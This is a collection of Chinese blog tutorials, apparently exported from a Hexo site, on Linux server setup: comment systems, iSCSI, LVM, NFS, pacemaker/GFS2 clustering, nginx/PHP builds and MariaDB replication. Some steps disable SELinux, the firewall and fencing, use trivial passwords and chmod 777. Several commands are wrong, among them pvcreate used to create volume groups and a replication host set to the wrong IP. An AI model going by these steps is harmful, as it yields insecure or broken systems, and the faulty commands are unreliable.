对评论区的功能进行更多的设置。\n\n可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。\n\n![添加站点](./changyan-comment/4.png)\n\n可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。\n\n![添加站点](./changyan-comment/5.png)\n\n还可以设置主题的样式。\n\n![添加站点](./changyan-comment/6.png)","tags":["博客评论"],"categories":["博客搭建"]},{"title":"博客评论系统之gitalk","url":"/2023/07/14/gitalk-comment/","content":"\n### 背景介绍\n\n自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。\n\n最初，我选择的是github的gitalk。\n\n### 环境说明\n\n我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。\n\n<!-- more -->\n\n### 创建仓库\n\n1. 直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。\n\n* 首先填写一个仓库名字，下面报红是因为我已经创建过一个了。\n* 仓库描述的话选填，可写可不写。\n* 选择为public。\n* 最后点击创建仓库。\n\n![创建仓库](./gitalk-comment/1.png)\n\n2. 除了建仓库，还需要注册一个应用。[官方注册地址](https://github.com/settings/applications/new)。\n\n* Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。\n* Homepage URL然后填写的是你的网站域名。\n* Application description接下来又是一个描述类的信息，选填。\n* Authorization callback URL这里同样填写你网站的域名。\n* 最后注册应用程序等待完成就好。\n\n![创建应用程序](./gitalk-comment/2.png)\n\n3. 创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。\n\n* Client ID默认会存在。这个待会还会用到。\n* 默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。\n* logo可以自己设计一个，感觉蛮不错的。\n* 都设置完之后点击最下面的Update Application。\n\n![设置应用程序](./gitalk-comment/3.png)\n\n后期如果需要对应用程序进行一些修改，可以依次到github头像-->setting-->Developer Settings-->OAuth Apps进行修改。\n\n### 修改配置文件\n\n修改配置文件的部分，进入博客主目录，`vim themes/next/_config.yml`\n\n1. 首先需要把`active`的值，改为gitalk\n\n```bash 折叠代码\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. 然后往下滑，找到gitalk的模块。\n\n  * enable的值设置为true，表示启用。\n  * github_id表示你的github的账号。\n  * repo，填写用来存储评论的仓库。\n  * client_id之前创建的ID。\n  * client_secret之前创建好的口令。\n  * admin_user这个是管理员的账户，也就是你自己的github账号。\n  * distraction_free_mode默认就好。\n  * proxy代理值，默认就好。\n  * language语言类型，别的地方我不管，在我这里必须讲中文。\n\n```bash 折叠代码\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","tags":["博客评论"],"categories":["博客搭建"]},{"title":"二进制日志与数据库复制的关系","url":"/2023/07/13/why-mysql-binlog/","content":"\n### 数据库复制的原理解读\n\n最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。\n\n这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。\n\n<!-- more -->\n\n![数据库主从复制的](./why-mysql-binlog/1.png)\n\n1. master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。\n\n2. slave会开启一个I/O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I/O连接将新事件写进自己的中继日志里去。\n\n3. SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。\n\n4. 通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制-->复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。\n\n### 额外的话\n\n在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库`show slave status \\G`的`Slave_IO_Running`和`Slave_SQL_Running`两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。","tags":["Linux","MySQL"],"categories":["理论知识"]},{"title":"Linux多网卡引起的网络不可达","url":"/2023/07/13/modify-METRIC/","content":"\n### 现象描述\n\n这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。\n\n在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试`ping 8.8.8.8`也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。\n\n<!-- more -->\n\n### 问题分析\n\n“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。\n\n查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\n那么问题就找到了，当我去`ping 8.8.8.8`的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。\n\n### 解决办法\n\n解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件`/etc/sysconfig/network-scripts/ifcfg-ens224`。只需要在里面加上一行`IPV4_ROUTE_METRIC=10`，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。\n\n然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去`ping 8.8.8.8`应该会发现已经好使了。","tags":["Linux"],"categories":["技术"]},{"title":"Linux关于iscsi+pacemaker+CLVM+gfs的实现","url":"/2023/07/05/gfs/","content":"\n### 基本信息\n\n|主机名|身份|网络接口|连接模式|IP地址|\n|:-:|:-:|:-:|:-:|:-:|\n|web3|web服务器|ens224|仅主机|10.8.7.82/24|\n|web4|web服务器|ens224|仅主机|10.8.7.83/24|\n|storage1|iscsi存储服务器|ens224|仅主机|10.8.7.41/24|\n|storage2|iscsi存储服务器|ens224|仅主机|10.8.7.42/24|\n\n### 项目说明\n\n在本项目中，主要完成以下任务：\n\n1. 完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。\n\n<!-- more -->\n\n2. 建立web1和web2主机的集群关系。\n\n3. 挂载GFS文件系统。\n\n4. 配置集群资源。\n\n5. 创建CLVM。\n\n6. 挂载共享存储。\n\n### 准备环境\n\n* Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。\n\n* 虚拟机关闭SELINUX。\n\n* 虚拟机关闭防火墙。\n\n* 虚拟机关闭NetworkManager。\n\n* 编写`/etc/hosts`文件，这个可选，我是为了后期配置方便，才写这样一个文件。\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\n如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### 项目实施\n\n* 一定要按照顺序来做。\n\n* 关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看[搭建并挂载ISCSI存储服务器](https://nustarain.gitee.io/2023/07/04/ISCSI/)这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是`/dev/sdb`，storage2提供的ISCSI存储映射到web服务器上是`/dev/sdc`。\n\n* 我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。\n\n* 下载软件，两台虚拟机都需要做的\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\n这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个`hacluster`用户，后面要用，要先给他改个密码。\n\n* 集群建立免认证，在集群任意一台机器做就可以\n\n说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\n上面的命令是以web3举的例子。\n\n* 搭建集群，两台虚拟机都需要做的\n\n```bash 折叠代码\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 如果报错就强制执行进行覆盖\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\n一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加`--force`选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。\n\n如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。\n\n```bash\npcs cluster destroy\n```\n\n* 挂载GFS文件系统，两台虚拟机都需要做的\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\n在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。\n\n* 配置集群资源，在集群任意一台机器做就可以\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\n这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* 创建CLVM，在集群任意一台机器做就可以\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\n这里命令的具体含义如果不懂，可以看我的[关于LVM的配置](https://nustarain.gitee.io/2023/07/04/LVM/)的文章。\n\n* 挂载实现共享存储\n\n```bash 折叠代码\n# 格式化文件系统，在集群任意一台机器做就可以\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# 创建挂载点，两台虚拟机都需要做的\nmkdir /mnt/cluster\n# 要实现自动挂载，在集群任意一台机器做就可以\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# 给集群资源设置启动顺序\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\n最后`df`如果看到自己创建的逻辑卷`/dev/qavg/qa`，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。","tags":["Linux"],"categories":["技术"]},{"title":"关于LVM的配置","url":"/2023/07/04/LVM/","content":"\n### 概述\n\nLVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。\n\n物理卷可以有很多形式，一块单独的磁盘（`/dev/sda`），一个分好的分区（`/dev/sdb2`），甚至一个文件都可以是物理卷的一种形式。\n\n单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。\n\n如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。\n\n### 物理卷\n\n* 创建物理卷\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* 查看物理卷的详细信息\n\n```bash\npvdisplay\n```\n\n* 查看物理卷的精简信息\n\n```bash\npvs\n```\n\n### 卷组\n\n* 创建卷组\n\n```bash\npvcreate qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组。\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。\n\n* 查看卷组的详细信息\n\n```bash\nvgdisplay\n```\n\n* 查看卷组的精简信息\n\n```bash\nvgs\n```\n\n* 扩容卷组\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\n将物理卷`dev/sdb2`加入卷组qavg\n\n* 删减卷组\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\n将物理卷`/dev/sdb2`从卷组qavg中删除\n\n* 删除卷组\n\n```bash\nvgremove qavg\n```\n\n* 重命名卷组\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\n重命名卷组`/dev/qavg1`为`/dev/qavg2`。\n\n### 逻辑卷\n\n* 创建逻辑卷\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\n利用`qavg`这个卷组创建一个叫`qa`大小为200M的逻辑卷。这里的**L选项**指定的是平常讲的磁盘的大小。\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\n使用**l选项**是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M\n\n* 扩容逻辑卷\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\n这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\n使用卷组里`/dev/sdk3`这个物理卷的全部空间为`qavg/qa`扩容。\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\n使用卷组里`/dev/sda`的8-9M的空间和`/dev/sdb`的8-9M的空间为逻辑卷`qavg/qa`扩容\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\n使用卷组所有剩余的空间为`qavg/qa`扩容。\n\n* 查看逻辑卷详细信息\n\n```bash\nlvdisplay\n```\n\n* 查看逻辑卷精简信息\n\n```bash\nlvs\n```\n\n* 删除逻辑卷\n\n```bash\nlvremove qa\n```\n\n这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！","tags":["Linux"],"categories":["理论知识"]},{"title":"搭建并挂载ISCSI存储服务器","url":"/2023/07/04/ISCSI/","content":"\n### ISCSI服务器端\n\n比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。\n\n1. 下载软件\n\n```bash\nyum install -y targetcli\n```\n\n2. 开始进行服务端的配置\n\n* 首先键入`targetcli`进入iscsi配置模式\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* 然后先创建一个后端存储\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`代表起的一个名字，`/dev/sdb`是真实机器里存在的设备。\n\n* 创建可以识别的iqn设备\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。\n\n* 创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* 创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\n不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个`acls`里的`iqn`名字复制下来待会粘贴到客户端的一个配置文件里面。\n\n* 设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* 到这里就设置完成了键入`exit`退出设置。\n\n* 启动服务\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSI客户端\n\n1. 下载软件\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. 修改配置文件`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\n把这里的iqn设置为服务器端`acls`里的那个iqn，上面也说过一嘴。\n\n3. 然后开始扫描iqn设备\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**p选项**后面接上服务器端的IP地址。\n\n4. 扫描到之后接着开始最后一步挂载\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**T选项**后面接上面刚刚扫描出来的iqn设备，**p选项**接ISCSI服务器的IP\n\n5. 可以通过下面的命令查看挂载成功的会话信息\n\n```bash\niscsiadm -m session\n```\n\n6. 如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. 写在最后的话\n\n如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除`/var/lib/iscsi/nodes`及`/var/lib/iscsi/send_targets`下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。","tags":["Linux"],"categories":["技术"]},{"title":"NFS挂载到服务器","url":"/2023/07/04/nfs/","content":"\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|NFS|存储服务器|ens224|仅主机|10.8.7.40/24|nfs-utils|\n|Web1|Web服务器|ens224|仅主机|10.8.7.80/24|nginx、nfs-utils|\n\n### NFS服务器部分\n\n1. 下载软件\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. 编辑配置文件`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\n这个配置文件代表将自己主机下的`/www`目录共享给10.8.7.80主机，并且赋予读和写的权限。\n\n3. 要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了`777`，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。\n\n```bash\nchmod 777 /www\n```\n\n4. 启动服务\n\n```bash\nsystemctl start nfs-server\n```\n\n5. 导出配置文件\n\n```bash\nexportfs -rv\n```\n\n### Web服务器的部分\n\n1. 创建挂载点\n\n```bash\nmkdir /www\n```\n\n2. 编辑`/etc/fstab`实现永久挂载\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. 挂载共享目录\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","tags":["Linux"],"categories":["技术"]},{"title":"NGINX整合PHP","url":"/2023/07/04/nginx-union-php/","content":"\n### NGINX整合PHP\n\n这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。\n\n<!-- more -->\n\n具体操作如下：\n\n* 打开NGINX的配置文件,添加这一段。\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\n补一张图片显示要插入的位置。\n\n![](./nginx-union-php/1.png)\n\n然后就完成了NGINX和PHP的联动。","tags":["Linux"]},{"title":"源码安装PHP","url":"/2023/07/04/php/","content":"\n### 安装PHP\n\n无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用`php-fpm start`启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。\n\n<!-- more -->\n\n[PHP源码包下载链接](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\n提取码：ba1u\n\n* 解压源码包\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\n这里分了两条依赖命令，如果是按照之前我写的[源码安装NGINX的博客](https://nustarain.gitee.io/2023/07/04/nginx/)已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* 再执行两步安装完成\n\n```bash\nmake  # 这里make的时间会相对长一点\nmake install\n```\n\n* 拷贝一份配置文件\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* 拷贝启动文件\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* 为启动文件添加启动权限\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* 再拷贝一份到系统的命令里面\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\n然后就可以使用简单的命令对PHP进行管理\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* 启动之后可以检查一下监听端口\n\n```bash\nlsof -i:9000\n```","tags":["Linux"],"categories":["技术"]},{"title":"源码安装NGINX","url":"/2023/07/04/nginx/","content":"\n### 安装NGINX\n\n如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。\n\n主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。\n\n<!-- more -->\n\n[nginx源码包下载链接](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\n提取码：46k1\n\n* 解压源码包\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* 再执行两步安装完成\n\n```bash\nmake\nmake install\n```\n\n此时NGINX的启动命令是在`/usr/local/nginx/sbin/nginx`里。\n\n直接执行这条命令可以启动NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\n但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\n然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。\n\n```bash\nnginx # 启动nginx\nnginx -s reload # 重启nginx\nnginx -s stop # 关闭nginx\n```\n\n启动之后，可以通过80端口检查是否处于监听状态\n\n```bash\nlsof -i:80\n```\n\n再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径`cd /usr/local/nginx/conf`里面很多我们不需要的内容，直接一条命令带走他们。\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n之后就很清爽了，开始配置吧少年。","tags":["Linux"],"categories":["技术"]},{"title":"Mariadb双主复制+Keepalived","url":"/2023/06/04/keepalived-linux/","content":"\n在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。\n\n### 项目梗概\n\n项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：\n\n<!-- more -->\n\n![拓扑图](./keepalived-linux/1.png)\n\n我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。\n\n其中服务器的IP规划如下：\n\n|  主机名   |  角色  | 网卡名 |  模式  |       IP        |       VIP       |      网关       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | 仅主机 | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | 仅主机 | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### 数据库服务器的配置\n\n数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。\n\n#### 主从复制配置\n\n|  主机名   |    身份    | 网络接口 | 连接模式 |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  主服务器  |  ens224  |  仅主机  | 172.21.8.33/24 |\n| mariadb-2 | 备份服务器 |  ens224  |  仅主机  | 172.21.8.34/24 |\n\n\n\n1. 首先在mariadb-1中进行软件的安装。\n\n```bash\nyum install -y mariadb-server\n```\n\n2. 修改配置文件。\n\n主配置文件`/etc/my.cnf`无需修改，修改`/etc/my.cnf.d/mariadb-server.cnf`文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. 启动mariadb-1的mariadb服务\n\n```\nsystemctl start mariadb\n```\n\n4. 进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`之后，表格中的File字段和Position字段要留意，待会要用到。\n\n5. 在mariadb-2上安装软件，开启二进制日志功能，并启动服务。\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. 进入MySQL，开启复制功能。\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_file字段填写mariadb-1`show master status`后的File内容，master_log_pos填写mariadb-1`show master status`后的Position内容。\n\n7. 在mariadb-2上查看slave状态。\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 复制成功](./keepalived-linux/4.png)\n\n看到图中的两个yes，代表一边的复制功能就配置完成了。\n\n8. 然后在mariadb-2 服务器上也创建一个授权账户。\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\n再次回到mariadb-1上，连接mariadb-2，实现复制功能。\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. 配置完成后，开启slave功能，查看slave状态。\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 复制成功](./keepalived-linux/6.png)\n\n到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。\n\n#### keepalived配置\n\n1. 主机 DB-master 和 DB-slave 上安装 Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. 把配置文件保留一个副本\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. 修改两个主机上的配置文件/etc/keepalived/keepalived.conf\n\n|  主机名   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | 